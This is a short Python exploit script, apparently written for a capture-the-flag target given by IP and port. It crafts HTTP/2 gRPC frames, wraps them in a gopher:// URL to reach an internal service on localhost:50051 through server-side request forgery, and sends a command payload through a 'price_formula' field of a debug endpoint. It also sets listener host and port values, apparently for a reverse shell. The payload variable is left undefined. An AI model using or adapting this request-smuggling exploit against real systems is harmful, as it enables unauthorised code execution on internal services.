from hyperframe.frame import HeadersFrame, DataFrame, SettingsFrame
from hyperframe.flags import Flag, Flags
from hpack import Encoder
import struct
from urllib.parse import quote
import product_pb2
import requests
import time
import os
import binascii

host = "83.136.252.13"
port = 34923
debug = False
if debug:
    host = "localhost"
    port = 1337

s = requests.Session()

lhost = "ip"
lport = 6666


def debug_service():
    req = product_pb2.MergeRequest()
    input_value = product_pb2.InputValue(string_value=rce)
    req.input["price_formula"].CopyFrom(input_value)

    print(req.SerializeToString())
    return build_http2_request(req.SerializeToString(), "/product.ProductService/DebugService")

def get_new_products():
    req = product_pb2.Empty()
    return build_http2_request(req.SerializeToString(), "/product.ProductService/GetNewProducts")

def build_http2_request(request_payload, path):
    preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

    # Add gRPC prefix to the payload (5 bytes)
    grpc_payload = struct.pack(">BI", 0, len(request_payload)) + request_payload  # Compression flag + length
    # Build HTTP/2 frames
    stream_id = 1
    encoder = Encoder()
    # SETTINGS frame (required for handshake)
    settings_frame = SettingsFrame(stream_id=0)
    settings = settings_frame.serialize()
    # HEADERS frame (with required pseudo-headers)
    headers = [
        (":method", "POST"),
        (":path", path),
        (":scheme", "http"),
        (":authority", "localhost:50051"),
        ("content-type", "application/grpc"),
        ("te", "trailers"),
    ]
    headers_frame = HeadersFrame(stream_id=stream_id)
    headers_frame.data = encoder.encode(headers)
    headers_frame.flags.add("END_HEADERS")
    headers = headers_frame.serialize()
    # DATA frame (gRPC payload)
    data_frame = DataFrame(stream_id=stream_id)
    data_frame.data = grpc_payload
    data_frame.flags.add("END_STREAM")
    data = data_frame.serialize()

    payload = quote(preface + settings + headers + data)
    return "gopher://localhost:50051/_" + payload


poison_req = debug_service()
shell_req = get_new_products()
